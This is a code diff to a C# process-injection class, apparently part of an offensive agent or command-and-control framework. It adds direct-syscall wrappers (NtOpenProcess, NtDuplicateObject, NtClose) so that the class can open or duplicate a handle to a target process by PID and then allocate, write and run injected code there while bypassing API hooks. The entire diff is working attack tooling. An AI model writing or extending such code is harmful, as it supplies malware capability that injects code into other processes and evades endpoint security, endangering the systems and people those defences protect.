@@ -9,6 +9,24 @@ namespace Injection.Techniques.Syscall_x64
     public class NtCreateThreadEx : InjectionTechnique
     {
         private USysCall64 _syscall;
+
+        private delegate uint NtOpenProcess(
+            ref IntPtr hProcess,
+            Win32.ACCESS_MASK dwDesiredAccess,
+            ref Win32.OBJECT_ATTRIBUTES ObjectAttributes,
+            ref Win32.CLIENT_ID ClientId);
+
+        private delegate uint NtDuplicateObject(
+            IntPtr hSourceProcessHandle,
+            IntPtr hSourceHandle,
+            IntPtr hTargetProcessHandle,
+            out IntPtr hTargetHandle,
+            Win32.ACCESS_MASK dwDesiredAccess,
+            bool bInheritHandle,
+            ulong dwOptions);
+
+        private delegate uint NtClose(IntPtr hObject);
+        
         private delegate uint NtAllocateVirtualMemory(
             IntPtr hProcess,
             ref IntPtr lpBaseAddress,
@@ -44,19 +62,55 @@ namespace Injection.Techniques.Syscall_x64
             uint SizeOfStackReserve,
             IntPtr lpBuffer);
         
+        
+        private NtOpenProcess _ntOpenProcess;
+        private NtClose _ntClose;
+        private NtDuplicateObject _ntDuplicateObject;
         private NtAllocateVirtualMemory _pNtAllocateVirtualMemory;
         private NtProtectVirtualMemory _pNtProtectVirtualMemory;
         private NtWriteVirtualMemory _pNtWriteVirtualMemory;
         private NtCreateThreadExDelegate _pNtCreateThreadEx;
 
-        public NtCreateThreadEx(IAgent agent, byte[] code, int pid) : base(agent, code, pid)
+        public NtCreateThreadEx(IAgent agent, byte[] code, int pid)
         {
-            Setup(agent);
+            _code = code;
+            _processId = pid;
+            _agent = agent;
+            Setup(_agent);
+            _hProcess = IntPtr.Zero;
+            Win32.OBJECT_ATTRIBUTES oa = new Win32.OBJECT_ATTRIBUTES();
+            Win32.CLIENT_ID clientId = new Win32.CLIENT_ID()
+            {
+                UniqueProcess = (IntPtr)_processId
+            };
+            var ntStatus = _ntOpenProcess(
+                ref _hProcess,
+                Win32.ACCESS_MASK.MAXIMUM_ALLOWED,
+                ref oa,
+                ref clientId);
+            if (ntStatus != 0)
+            {
+                throw new Exception("Failed to open handle process.");
+            }
         }
 
-        public NtCreateThreadEx(IAgent agent, byte[] code, IntPtr hProcess) : base(agent, code, hProcess)
+        public NtCreateThreadEx(IAgent agent, byte[] code, IntPtr hProcess)
         {
+            _code = code;
+            _agent = agent;
             Setup(agent);
+            var ntStatus = _ntDuplicateObject(
+                System.Diagnostics.Process.GetCurrentProcess().Handle,
+                hProcess,
+                hProcess,
+                out _hProcess,
+                Win32.ACCESS_MASK.MAXIMUM_ALLOWED,
+                false,
+                0);
+            if (ntStatus != 0)
+            {
+                throw new Exception("Failed to duplicate handle.");
+            }
         }
 
         private void Setup(IAgent agent)
@@ -66,6 +120,34 @@ namespace Injection.Techniques.Syscall_x64
                 throw new Exception("Must be running in a 64-bit process.");
             }
             _syscall = new USysCall64(agent);
+            try
+            {
+                _ntOpenProcess = _syscall.MarshalNtSyscall<NtOpenProcess>("NtOpenProcess");
+            }
+            catch (Exception ex)
+            {
+                throw new Exception("Failed to get function pointer for NtOpenProcess", ex);
+            }
+
+            try
+            {
+                _ntClose = _syscall.MarshalNtSyscall<NtClose>("NtClose");
+                _pCloseHandle = Marshal.GetDelegateForFunctionPointer(Marshal.GetFunctionPointerForDelegate(_ntClose), typeof(CloseHandle)) as CloseHandle;
+            }
+            catch (Exception ex)
+            {
+                throw new Exception("Failed to get function pointer for NtClose", ex);
+            }
+            
+            try
+            {
+                _ntDuplicateObject = _syscall.MarshalNtSyscall<NtDuplicateObject>("NtDuplicateObject");
+            }
+            catch (Exception ex)
+            {
+                throw new Exception("Failed to get function pointer for NtDuplicateObject", ex);
+            }
+            
             try
             {
                 _pNtAllocateVirtualMemory = _syscall.MarshalNtSyscall<NtAllocateVirtualMemory>("NtAllocateVirtualMemory");
